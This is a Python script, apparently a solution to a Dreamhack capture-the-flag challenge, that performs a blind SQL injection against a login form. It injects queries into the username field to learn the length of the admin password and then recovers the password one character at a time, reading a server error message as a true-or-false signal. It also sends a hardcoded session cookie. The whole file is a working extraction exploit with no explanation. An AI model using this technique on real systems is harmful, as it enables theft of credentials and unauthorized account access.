import requests
import time
import base64
import os
from tqdm import tqdm

url ='http://host3.dreamhack.games:17788/login'
params = {'username': '', 'userpassword': ''}
cookie = {'session': 'eyJpZCI6eyIgYiI6IkV2TURVZTFxb3RoYTFWUTN4cTRnMVE9PSJ9LCJ0cmllcyI6MX0.Y6qr1A.rsk13I5H7JD97L2-SHdB-8DW4xw'}

# 1. admin의 비밀번호의 길이 알아내기
def find_password_length(user):
    for i in tqdm(range(1, 100)):
        query = f'\' or ((SELECT LENGTH(password) WHERE username=\'{user}\')={i});#'
        params['username'] = query
        params['password'] = 'testestset'
        data = requests.post(url, data=params, cookies=cookie).text
        if 'What? you are hacker! I reset password!' in data:
            return i
        time.sleep(0.5)
        

#pw_length = find_password_length('admin')
pw_length = 32
print(pw_length)

# 2. admin의 비밀번호 알아내기
def find_password(user, pw_length):
    password = ''
    for i in range(1, pw_length+1):
        for j in tqdm(range(33, 127)):
            query = f'\' or (SELECT SUBSTR((SELECT password WHERE username=\'{user}\'), {i}, 1)) = CHAR({j});#'
            params['username'] = query
            params['password'] = 'testestset'
            data = requests.post(url, data=params, cookies=cookie).text
            if 'What? you are hacker! I reset password!' in data:
                password += chr(j)
                break
            time.sleep(0.3)
    return password

print(find_password('admin', pw_length))
